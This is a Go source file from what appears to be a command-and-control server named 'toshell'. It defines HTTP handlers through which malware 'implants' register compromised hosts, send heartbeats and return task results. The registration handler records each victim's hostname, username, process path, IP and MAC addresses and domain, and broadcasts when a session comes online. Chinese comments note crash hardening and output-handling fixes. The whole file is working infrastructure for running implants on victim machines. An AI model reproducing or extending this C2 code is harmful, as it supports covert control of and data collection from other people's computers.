package api

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"time"

	"toshell/internal/common/protocol"
	"toshell/internal/common/types"
)

func (s *Server) implantRegisterHandler(w http.ResponseWriter, r *http.Request) {
	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, `{"error":"Failed to read body"}`, http.StatusBadRequest)
		return
	}

	// 安全加固：body 过短时 body[:8] 会 panic（远程无凭据打崩进程）。
	// 合法注册帧至少包含 magic(4)+version(1)+type(1)+id(8) 等头部，远大于 8 字节。
	if len(body) < 8 {
		http.Error(w, `{"error":"payload too short"}`, http.StatusBadRequest)
		return
	}

	fmt.Printf("[INFO] [implant] Register request received, len: %d\n", len(body))

	// Try to parse as Register payload
	var reg protocol.Register
	if err := json.Unmarshal(body, &reg); err == nil {
		now := time.Now()
		sessionID := fmt.Sprintf("%x-%d", body[:8], now.UnixNano())

		sessInfo := &types.SessionInfo{
			ID:           sessionID,
			Hostname:     reg.Hostname,
			Username:     reg.Username,
			OS:           reg.OS,
			Arch:         reg.Arch,
			PID:          reg.PID,
			ProcessName:  reg.ProcessName,
			ProcessPath:  reg.ProcessPath,
			IPAddresses:  reg.IPAddresses,
			MACAddresses: reg.MACAddresses,
			Domain:       reg.Domain,
			FirstSeen:    now,
			LastSeen:     now,
			Status:       "active",
			Listener:     "api",
			RemoteAddr:   r.RemoteAddr,
		}

		if err := s.sessionMgr.Add(sessInfo); err != nil {
			// Session already exists, update it
			s.sessionMgr.Update(sessionID, sessInfo)
		}

		fmt.Printf("[INFO] [implant] Session registered: %s (%s@%s)\n", sessionID, reg.Username, reg.Hostname)

		// 广播上线事件（统一走去抖入口，重复注册不会重复广播）
		s.BroadcastSessionOnline(sessInfo)
	}

	w.WriteHeader(http.StatusOK)
	w.Write([]byte(`{"status":"registered"}`))
}

func (s *Server) implantHeartbeatHandler(w http.ResponseWriter, r *http.Request) {
	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, `{"error":"Failed to read body"}`, http.StatusBadRequest)
		return
	}

	// Try to parse heartbeat data
	var hb protocol.Heartbeat
	if err := json.Unmarshal(body, &hb); err == nil {
		// Iterate sessions to find matching one by remote addr or just update heartbeat timestamps
		sessions := s.sessionMgr.List()
		for _, sess := range sessions {
			// Update heartbeat if session ID matches or connection matches
			prevStatus := sess.Info.Status
			if !sess.IsAlive() {
				prevStatus = "dead"
			}

			sess.Heartbeat = &hb
			sess.LastSeen = time.Now()
			sess.Info.CPUUsage = hb.CPUUsage
			sess.Info.MemoryUsed = hb.MemoryUsed
			sess.Info.ActiveModules = hb.Modules
			sess.Info.LastSeen = time.Now()

			newStatus := "active"
			if !sess.IsAlive() {
				newStatus = "dead"
			}
			sess.Info.Status = newStatus

			// Broadcast if status changed from dead to active
			if prevStatus == "dead" && newStatus == "active" && s.wsHub != nil {
				s.wsHub.Broadcast(WSEvent{
					Type: "session_online",
					Payload: map[string]interface{}{
						"id":       sess.Info.ID,
						"hostname": sess.Info.Hostname,
						"username": sess.Info.Username,
						"os":       sess.Info.OS,
						"arch":     sess.Info.Arch,
						"status":   newStatus,
					},
				})
			}
		}
	}

	w.WriteHeader(http.StatusOK)
	w.Write([]byte(`{"status":"ok"}`))
}

func (s *Server) implantResultHandler(w http.ResponseWriter, r *http.Request) {
	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, `{"error":"Failed to read body"}`, http.StatusBadRequest)
		return
	}

	fmt.Printf("[INFO] [implant] Result received, len: %d\n", len(body))

	// Try to parse as Result payload
	var result protocol.Result
	if err := json.Unmarshal(body, &result); err == nil {
		if result.TaskID > 0 {
			if result.ExitCode == 0 && result.Error == "" {
				s.taskMgr.Complete(result.TaskID, result.ExitCode, result.Output, result.Error)

				// 摘要：按 rune 边界截断 + 展示层编码归一（旧 output[:200] 会切坏中文）
				outputSummary := summarizeOutput(result.Output, 200)

				// Broadcast task_completed event
				if s.wsHub != nil {
					taskInfo, err := s.taskMgr.Get(result.TaskID)
					sessionID := ""
					taskType := ""
					if err == nil && taskInfo != nil {
						sessionID = taskInfo.SessionID
						taskType = taskInfo.TaskType
					}

					s.wsHub.Broadcast(WSEvent{
						Type: "task_completed",
						Payload: map[string]interface{}{
							"task_id":    result.TaskID,
							"task_type":  taskType,
							"session_id": sessionID,
							"exit_code":  result.ExitCode,
							"output":     outputSummary,
						},
					})
				}
			} else {
				// 失败也要留下输出：旧代码只回一句 error，把 result.Output 丢掉，
				// 结果是"失败任务只剩 exit code"，排障时看不到工具自己打印的原因。
				s.taskMgr.FailWithResult(result.TaskID, result.ExitCode, result.Output, result.Error)

				// Broadcast task_failed event
				if s.wsHub != nil {
					taskInfo, _ := s.taskMgr.Get(result.TaskID)
					sessionID := ""
					taskType := ""
					if taskInfo != nil {
						sessionID = taskInfo.SessionID
						taskType = taskInfo.TaskType
					}

					s.wsHub.Broadcast(WSEvent{
						Type: "task_failed",
						Payload: map[string]interface{}{
							"task_id":    result.TaskID,
							"task_type":  taskType,
							"session_id": sessionID,
							"exit_code":  result.ExitCode,
							"output":     summarizeOutput(result.Output, 200),
							"error":      displayOutput(result.Error),
						},
					})
				}
			}
		}
	}

	w.WriteHeader(http.StatusOK)
	w.Write([]byte(`{"status":"ok"}`))
}
